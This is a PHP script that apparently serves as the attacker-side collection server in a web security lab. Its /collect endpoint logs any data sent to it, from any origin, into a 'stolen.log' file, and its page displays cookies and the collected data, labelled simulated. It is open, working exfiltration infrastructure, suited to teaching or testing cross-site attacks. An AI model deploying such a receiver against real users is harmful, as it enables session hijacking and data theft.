<?php
declare(strict_types=1);

$host = $_SERVER['HTTP_HOST'] ?? '';
$uri = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);

function h(string $s): string {
  return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$logFile = sys_get_temp_dir() . '/stolen.log';

if ($uri === '/collect') {
  if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, OPTIONS');
    header('Access-Control-Allow-Headers: *');
    header('Access-Control-Max-Age: 86400');
    exit;
  }

  header('Access-Control-Allow-Origin: *');
  $d = (string)($_GET['d'] ?? '');
  $line = date('c') . ' host=' . $host . ' ip=' . ($_SERVER['REMOTE_ADDR'] ?? '') . ' d=' . $d . "\n";
  file_put_contents($logFile, $line, FILE_APPEND);
  header('Content-Type: text/plain; charset=utf-8');
  echo "ok\n";
  exit;
}

header('Content-Type: text/html; charset=utf-8');

$cookiesHeader = (string)($_SERVER['HTTP_COOKIE'] ?? '');
$stolen = file_exists($logFile) ? (string)file_get_contents($logFile) : '';

echo '<!doctype html><html><head><meta charset="utf-8"><title>meldeamt</title></head><body>';
echo '<h1>meldeamt service</h1>';
echo '<p><strong>Host:</strong> ' . h($host) . '</p>';

echo '<h2>Cookies the browser sends to this host</h2>';
echo '<pre>' . h($cookiesHeader) . '</pre>';

echo '<h2>Collected / exfiltrated data (simulated)</h2>';
echo '<p>Endpoint: <code>/collect?d=...</code></p>';
echo '<pre style="white-space:pre-wrap">' . h($stolen) . '</pre>';

echo '</body></html>';
